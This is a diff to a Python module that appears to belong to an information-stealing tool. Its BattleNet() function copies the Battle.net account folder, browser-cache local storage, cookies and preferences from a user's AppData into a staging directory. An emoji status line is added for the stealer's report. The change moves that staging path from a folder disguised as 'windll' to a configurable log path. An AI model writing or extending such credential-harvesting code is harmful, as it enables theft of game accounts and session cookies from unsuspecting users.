@@ -13,11 +13,14 @@
 from os import sep,environ,makedirs,path
 from shutil import copytree, copy2
 from manager.logger import Log
+from preferences.config import config
 
 def BattleNet():
-    pathtofolder = environ['USERPROFILE'] + sep + r'AppData\Local'
+    user = environ['USERPROFILE']
+    pathtofile = f'{user}\\{config.pathToLogs}'
+    local = environ['USERPROFILE'] + sep + r'AppData\Local'
     msgInfo = ""
-    if path.exists(f"{pathtofolder}\Battle.net\Account"):
+    if path.exists(f"{local}\Battle.net\Account"):
         folders= [
             r'\Battle.net\Account',
             r'\Battle.net\BrowserCaches\common\Local Storage',
@@ -28,15 +31,15 @@ def BattleNet():
             r'\Battle.net\BrowserCaches\LocalPrefs.json',
             r'\Battle.net\BrowserCaches\common\Cookies'
         ]
-        makedirs(rf"{pathtofolder}\windll\Games\Battle.net")
+        makedirs(f"{pathtofile}\\Games\\Battle.net")
         for folder in folders:
             try:
-                copytree(f"{pathtofolder}{folder}",f"{pathtofolder}\windll\Games{folder}")
+                copytree(f"{local}{folder}",f"{pathtofile}\\Games{folder}")
             except Exception as e:
                 Log(f"BattleNet(folders) ---> {e}")
         for file in files:
             try:
-                copy2(f"{pathtofolder}{file}",f"{pathtofolder}\windll\Games{file}")
+                copy2(f"{local}{file}",f"{pathtofile}\\Games{file}")
             except Exception as e:
                 Log(f"BattleNet(files) ---> {e}")
         msgInfo+="\n∟🎮Battle.net"
